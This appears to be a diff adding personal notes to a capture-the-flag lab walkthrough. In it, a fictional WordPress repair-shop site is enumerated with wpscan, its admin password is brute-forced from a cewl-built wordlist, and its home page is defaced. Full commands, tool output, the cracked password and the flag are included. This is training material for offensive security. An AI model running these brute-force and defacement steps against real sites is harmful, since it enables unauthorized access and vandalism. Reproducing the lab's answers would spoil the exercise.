@@ -404,3 +404,410 @@ So, how can you protect against these attacks?
 With the theory out of the way, it's time to hack a site!
 Answer the questions below
 Open up the web browser _in your AttackBox_ and navigate to:
+`http://repairshop.sbrc`
+You should see the front page for "Theo's Computer Repair Shop":
+![Website home page](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/15ee042241ce.png)
+Take a look around the site. In the footer at the bottom of the page you will find confirmation this site is running on Wordpress:
+![Website Footer](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/5d53f4649bbe.png)
+If this wasn't here then we would often be able to identify that the site is using Wordpress through one of the common pages used by Wordpress. For example, if the site has a page called `/wp-login.php` then it's almost certainly going to be using Wordpress.
+A hacker will usually spend a fair deal of time just looking around the site and getting to grips with the functionality available. For example, they may try to see if there are protections around the login page, or scrape useful information such as email addresses, names, and phone numbers.
+Switch to the "Contact" page. What is the phone number given for the company?
+*08081 570087*
+---
+When enumerating Wordpress, hackers will often use a tool called [wpscan](https://wpscan.com/wordpress-security-scanner). This tool enumerates a variety of things on a Wordpress site, including users, plugins, version numbers, themes, and many more. If the hacker has downloaded a token to access the (free) wpscan API then they are also able to see if any part of the site has components with known vulnerabilities, completely automatically. Wpscan also provides us with the ability to easily bruteforce credentials, which is a handy feature when there are no protective measures on the login page.
+Let's perform a simple enumeration of the target site.
+In a terminal on the AttackBox, type this command and press enter:
+`wpscan --url http://repairshop.sbrc --no-update -e u   `
+This performs basic enumeration against the target, as well as specifically enumerating users.
+When the results are returned, you can see that there is one user on the website: "theo"
+![User Enumeration results](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/963516bf0563.png)
+Completed
+We have a username -- now let's get a password!
+This is an IT company, so we'd hope that Theo's password is not in any default password lists. Instead, we will use a tool called [cewl](https://digi.ninja/projects/cewl.php) to scan the site for possible passwords and save them to a file:
+`cewl http://repairshop.sbrc > wordlist`
+In the real world we would usually perform "mutations" on this list to add things like common numbers and symbols on at the end, and otherwise customise the list for the target. This is a complicated process, so in the interests of keeping this simple, we will assume that the password policy is lax and the list that we've just created will be enough to bruteforce the password.
+Let's try this now:
+`wpscan --url http://repairshop.sbrc -U theo -P wordlist   `
+This will once again run a scan against the site, but it will also attempt to bruteforce Theo's password using the list that we generated.
+You should find that a password is found!
+![Password cracked!](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/b6c6fb9a1303.png)
+What is Theo's password?
+Submit
+Now that we have credentials, we can do basically anything that we want to this site.
+First, let's login. Head to `http://repairshop.sbrc/wp-login.php` in your AttackBox web browser and login using the credentials that you found.
+The page that loads is the administrative interface for Wordpress.
+---
+What kind of hack wouldn't be complete without some mindless defacement?
+Hover over the "Pages" button in the left hand menu then click "All Pages":
+![Wordpress Dashboard](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/f439953d85ba.png)
+Next, click the "Edit" button for the home page:
+![Page Edit button](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/df5188b5fe58.png)
+You can now do whatever you want with the home page (remember that this is a lab environment with no bearing on real life). Deface it however you like. Maybe delete all the text? Go nuts!
+---
+We're hackers here -- we have to fit in with the stereotype and leave a calling card!
+Add a message somewhere on the home page that says:
+`Hacked By YOUR-USERNAME-HERE`
+![Hacked By You!](https://assets.muirlandoracle.co.uk/thm/rooms/cyberweek2021/0d5dc88e837f.png)
+_**Note:** the wording here is very important. Make sure to get "Hacked By" into the page somewhere!_
+Once you've added the message, make sure to click the blue "Update" button at the top right of the screen.
+Completed
+Time to claim your prize!
+Navigate to `10.10.178.103:9999` in your AttackBox web browser.
+If you successfully added the "Hacked By" message into the home page then there should be a flag displayed on the page which loads.
+What is this flag?
+
+## Enumeration
+```text
+root@ip-10-10-245-241:/etc/setoolkit# wpscan --url http://repairshop.sbrc --no-update -e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.7
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://repairshop.sbrc/ [10.10.178.103]
+[+] Started: Thu Feb 16 05:11:45 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.37 (centos)
+ |  - X-Powered-By: PHP/7.2.24
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://repairshop.sbrc/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://repairshop.sbrc/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://repairshop.sbrc/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://repairshop.sbrc/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6.1 identified (Outdated, released on ).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://repairshop.sbrc/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.6.1</generator>
+ | Confirmed By: Emoji Settings (Passive Detection)
+ |  - http://repairshop.sbrc/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.1'
+
+[+] WordPress theme in use: computer
+ | Location: http://repairshop.sbrc/wp-content/themes/computer/
+ | Latest Version: 1.1 (up to date)
+ | Last Updated: 2019-03-12T00:00:00.000Z
+ | Readme: http://repairshop.sbrc/wp-content/themes/computer/readme.txt
+ | Style URL: http://repairshop.sbrc/wp-content/themes/computer/style.css?ver=5.6.1
+ | Style Name: Computer
+ | Style URI: https://flythemes.net/wordpress-themes/free-computer-wordpress-theme/
+ | Description: Computer is a responsive WordPress theme crafted for any computer, mobile phones, tablet, Mac or ele...
+ | Author: Flythemes
+ | Author URI: https://flythemes.net
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://repairshop.sbrc/wp-content/themes/computer/style.css?ver=5.6.1, Match: 'Version: 1.1'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <==> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] theo
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Thu Feb 16 05:11:50 2023
+[+] Requests Done: 51
+[+] Cached Requests: 7
+[+] Data Sent: 11.289 KB
+[+] Data Received: 140.918 KB
+[+] Memory used: 141.152 MB
+[+] Elapsed time: 00:00:05
+
+root@ip-10-10-245-241:~# cewl http://repairshop.sbrc > wordlist
+/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated
+root@ip-10-10-245-241:~# cat wordlist 
+CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+Repair
+Computer
+Theo
+Service
+Inverkeithing
+Shop
+header
+and
+the
+Best
+inner
+Contact
+prime
+entry
+Feed
+Home
+our
+business
+you
+Repairs
+logo
+Menu
+toggle
+sitenav
+menu
+services
+from
+fixing
+computers
+setting
+for
+High
+help
+computer
+years
+Phone
+Network
+Setups
+content
+post
+sidebar
+main
+container
+Powered
+WordPress
+copyright
+Comments
+RSD
+Welcome
+put
+customers
+first
+Our
+range
+sourcing
+components
+broken
+builds
+mobile
+devices
+peripherals
+virus
+removal
+many
+more
+addition
+repair
+also
+have
+both
+new
+refurbished
+phones
+tablets
+available
+sale
+shop
+Street
+need
+your
+home
+network
+can
+with
+that
+too
+Just
+give
+call
+sort
+out
+quote
+About
+Owner
+been
+over
+twenty
+now
+starting
+programmer
+before
+retiring
+open
+five
+ago
+Today
+team
+work
+tirelessly
+bring
+best
+around
+Meet
+Team
+Gillian
+King
+James
+Douglas
+Support
+Richar
+Right
+Chris
+Jones
+Sarah
+Smith
+Virus
+Removal
+Aditya
+Varma
+Address
+Number
+Email
+contact
+repairshop
+sbrc
+look
+forward
+hearing
+
+root@ip-10-10-245-241:~# wpscan --url http://repairshop.sbrc -U theo -P wordlist_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.7
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://repairshop.sbrc/ [10.10.178.103]
+[+] Started: Thu Feb 16 05:16:25 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.37 (centos)
+ |  - X-Powered-By: PHP/7.2.24
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://repairshop.sbrc/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://repairshop.sbrc/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://repairshop.sbrc/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://repairshop.sbrc/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6.1 identified (Insecure, released on ).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://repairshop.sbrc/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.6.1</generator>
+ | Confirmed By: Emoji Settings (Passive Detection)
+ |  - http://repairshop.sbrc/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.1'
+
+[+] WordPress theme in use: computer
+ | Location: http://repairshop.sbrc/wp-content/themes/computer/
+ | Last Updated: 2021-10-14T00:00:00.000Z
+ | Readme: http://repairshop.sbrc/wp-content/themes/computer/readme.txt
+ | [!] The version is out of date, the latest version is 1.2
+ | Style URL: http://repairshop.sbrc/wp-content/themes/computer/style.css?ver=5.6.1
+ | Style Name: Computer
+ | Style URI: https://flythemes.net/wordpress-themes/free-computer-wordpress-theme/
+ | Description: Computer is a responsive WordPress theme crafted for any computer, mobile phones, tablet, Mac or ele...
+ | Author: Flythemes
+ | Author URI: https://flythemes.net
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://repairshop.sbrc/wp-content/themes/computer/style.css?ver=5.6.1, Match: 'Version: 1.1'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 1 user/s
+Trying theo / CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://[SUCCESS] - theo / Inverkeithing                                                
+Trying theo / Shop Time: 00:00:01 <           > (10 / 149)  6.71%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: theo, Password: Inverkeithing
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Thu Feb 16 05:16:31 2023
+[+] Requests Done: 149
+[+] Cached Requests: 36
+[+] Data Sent: 35.026 KB
+[+] Data Received: 88.604 KB
+[+] Memory used: 303.477 MB
+[+] Elapsed time: 00:00:06
+
+now login
+
+http://10.10.178.103:9999/
+Well done! Here is the flag: SBRC{ODhiOTQ3ZTk0NzJhMWI1NTE5MGUyY2Vj}
+```
+![[Pasted image 20230216002122.png]]
+![[Pasted image 20230216002209.png]]
+*SBRC{ODhiOTQ3ZTk0NzJhMWI1NTE5MGUyY2Vj}*
+
+## Notes / Lessons Learned
+[[Intrusion Detection]]
+
